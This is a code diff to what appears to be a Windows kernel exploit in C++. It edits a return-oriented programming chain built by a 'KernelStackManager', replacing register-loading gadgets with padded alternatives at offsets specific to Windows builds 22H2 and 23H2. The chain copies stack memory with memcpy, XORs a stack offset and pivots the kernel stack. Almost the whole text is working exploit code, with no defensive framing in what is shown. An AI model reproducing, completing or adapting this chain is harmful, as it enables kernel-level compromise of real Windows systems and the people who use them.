@@ -65,8 +65,10 @@ int main()
     KernelStackManager.AddGadget(0x263f08, "add rax, rcx; ret;");
 
     // rdx = stack limit store address
-    KernelStackManager.AddGadget(0x480032, "pop rdx; ret;");
+    KernelStackManager.AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
+    KernelStackManager.AddPadding(0x10);
     KernelStackManager.AddValue((std::uint64_t)StackLimitStoreAddress, "stack limit store address");
+    KernelStackManager.AddPadding(0x8);
 
     // dereference rax, so that rax = stack limit
     KernelStackManager.AddGadget(0x27af45, "mov rax, qword ptr [rax]; ret;");
@@ -102,17 +104,22 @@ int main()
 
     // this gadget can either write into r8 or rdx, depending on the window version, so we will set both
     // to a valid memory dummy pool so that it writes there.
-    KernelStackManager.AddGadget(0x480032, "pop rdx; ret;");
+    KernelStackManager.AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
+    KernelStackManager.AddPadding(0x10);
     KernelStackManager.AddValue((uint64_t)DummyMemoryAllocation, "rdx = dummy pool allocation");
-    KernelStackManager.AddGadget(0x47f82d, "pop r8; ret;");
+    KernelStackManager.AddPadding(0x8);
+    KernelStackManager.AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
     KernelStackManager.AddValue((uint64_t)DummyMemoryAllocation, "r8 = dummy pool allocation");
+    KernelStackManager.AddPadding(0x28);
     KernelStackManager.AddGadget(0xa9b72d, "mov rcx, r9; mov qword ptr \[[a-zA-Z0-9]{2,3}\], [a-zA-Z0-9]{2,3}; ret;");
 
-
-    KernelStackManager.AddGadget(0x480032, "pop rdx; ret;");
+    KernelStackManager.AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
+    KernelStackManager.AddPadding(0x10);
     KernelStackManager.AddValue((std::uint64_t)OriginalStackAllocation, "src address");
-    KernelStackManager.AddGadget(0x47f82d, "pop r8; ret;");
+    KernelStackManager.AddPadding(0x8);
+    KernelStackManager.AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
     KernelStackManager.AddValue(0x2000, "count value");
+    KernelStackManager.AddPadding(0x28);
     KernelStackManager.AddFunctionCall("memcpy");
 
     // Grab stack limit
@@ -142,10 +149,13 @@ int main()
     KernelStackManager.AddGadget(0x2f3286, "mov r9, rax; mov rax, r9; (add rsp, 0x28; )?ret;");
     if (WindowsBuild == "22H2" || WindowsBuild == "23H2")
         KernelStackManager.AddPadding(0x28);
-    KernelStackManager.AddGadget(0x480032, "pop rdx; ret;");
+    KernelStackManager.AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
+    KernelStackManager.AddPadding(0x10);
     KernelStackManager.AddValue((uint64_t)DummyMemoryAllocation, "rdx = dummy pool allocation");
-    KernelStackManager.AddGadget(0x47f82d, "pop r8; ret;");
+    KernelStackManager.AddPadding(0x8);
+    KernelStackManager.AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
     KernelStackManager.AddValue((uint64_t)DummyMemoryAllocation, "r8 = dummy pool allocation");
+    KernelStackManager.AddPadding(0x28);
     KernelStackManager.AddGadget(0xa9b72d, "mov rcx, r9; mov qword ptr \[[a-zA-Z0-9]{2,3}\], [a-zA-Z0-9]{2,3}; ret;");
     // r11=rcx
     KernelStackManager.AddGadget(0xb4096a, "mov r11, rcx; mov r9d, edx; cmp edx, dword ptr [rax]; je 0x......; mov eax, 0xc000000d; ret;");
@@ -154,8 +164,10 @@ int main()
     // meaning we will always swap between 0x2000 and 0x4000 per iteration.
     KernelStackManager.AddGadget(0x202547, "pop rax; ret;");
     KernelStackManager.AddValue(0x6000, "xor key (0x6000)");
-    KernelStackManager.AddGadget(0x480032, "pop rdx; ret;");
+    KernelStackManager.AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
+    KernelStackManager.AddPadding(0x10);
     KernelStackManager.AddValue((std::uint64_t)CurrentStackOffsetAddress, "current stack offset addr (to xor)");
+    KernelStackManager.AddPadding(0x8);
     KernelStackManager.AddGadget(0x43d5e8, "xor qword ptr [rdx], rax; ret;");
 
     // perform pivot, rsp=r11
